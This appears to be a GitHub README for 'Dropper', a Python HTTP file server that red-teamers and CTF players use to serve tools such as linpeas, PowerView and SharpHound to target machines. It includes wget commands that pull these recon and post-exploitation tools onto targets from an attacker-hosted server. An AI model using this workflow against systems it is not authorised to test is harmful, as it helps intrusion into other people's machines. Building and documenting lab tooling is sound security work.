# Dropper

**Dropper** is a minimal and practical HTTP file server for quickly sharing payloads and tools on LANs and lab environments.

It’s designed for red-teamers, pentesters, and CTF players who need a fast, reliable way to host tooling without juggling multiple servers or typing long paths.

## Why I built Dropper

I organize platform-specific payloads and tools into separate folders (`windows/, linux/`) so I can quickly access the right tools.

```
~/pentest/
├─ linux/
│  └─ linpeas.sh
└─ windows/
   └─ powerview.ps1
   └─ datacollectors/
       └─ sharphound.exe
```

During labs or CTFs, , I often need both Linux and Windows payloads in the same session. Without **Dropper**, this gets frustrating:

```
# Typing long paths for each payload

wget http://<ip>:<port>/linux/linpeas.sh
wget http://<ip>:<port>/windows/powerview.ps1
wget http://<ip>:<port>/windows/datacollectors/sharphound.exe

```
Long paths like these are annoying to type and easy to mistype. One missed character can break the command, slowing down your workflow — especially when you’re working on a live target or in timed labs.

### Dropper solves this problem by:

Serving a single root directory with subfolders for each platform (`windows/`, `linux/`, etc.), so all payloads are accessible from one place.

Providing a short `/drop/<filename>` URL for fast access. For example, instead of typing full paths:

```
wget http://<ip>:<port>/drop/linpeas.sh
wget http://<ip>:<port>/drop/powerview.ps1
wget http://<ip>:<port>/drop/sharphound.exe
```

Allowing optional Basic Auth to protect files in shared labs or teams, or `--no-auth` to quickly spin up the server in isolated lab environments.

This approach saves time, reduces typos, and makes fetching the right tool fast and reliable in high-pressure lab or CTF scenarios. With Dropper, you never have to juggle multiple servers or painfully long paths again.


## Quick start

### clone repo

```bash
git clone https://github.com/iqlipx/dropper.git

cd dropper
```
### Run the server 

**With authentication:**
```
export DROP_AUTH="user:pass"      # Linux/macOS
set DROP_AUTH=user:pass           # Windows CMD
$env:DROP_AUTH="user:pass"        # Windows PowerShell

python3 dropper.py --dir ~/pentest --host 0.0.0.0 --port 8000

```

**Without authentication (quick lab use):**
```
python3 dropper.py --dir ~/pentest --host 0.0.0.0 --port 8080 --no-auth
```
**Options:**

`--dir` : directory to serve (default: .)

`--host` : bind address (default: 127.0.0.1)

`--port` : port (default: 8000)

`--no-auth` : run without authentication (temporary; use only on trusted networks)

### Download payloads on targets

Use the /drop/<filename> shortcut instead of long paths:

```
wget http://<ip>:<port>/drop/linpeas.sh
wget http://<ip>:<port>/drop/powerview.ps1
wget http://<ip>:<port>/drop/sharphound.exe
```

###  Optional: Create a shortcut alias

```
# Add this line to ~/.bashrc or ~/.zshrc
alias dropper="python3 /full/path/to/dropper/dropper.py --dir ~/pentest --host 0.0.0.0 --port 8000 --no-auth"

# Then reload shell
source ~/.zshrc or ~/.bashrc

# Now you can start the server simply by:
dropper
```

### Tips for Labs / CTFs

**Keep files organized** – put payloads in folders that make sense so you can find them quickly.

**Use short URLs** – always use /drop/<filename> to avoid typing long paths.

**Ensure unique filenames** – don’t have two files with the same name, or the server will rename one to avoid collisions.

**Make a shortcut** – create a shell alias to start the server faster.

**No auth in safe environments** – use --no-auth if you are in a private lab, local network, or behind a VPN.
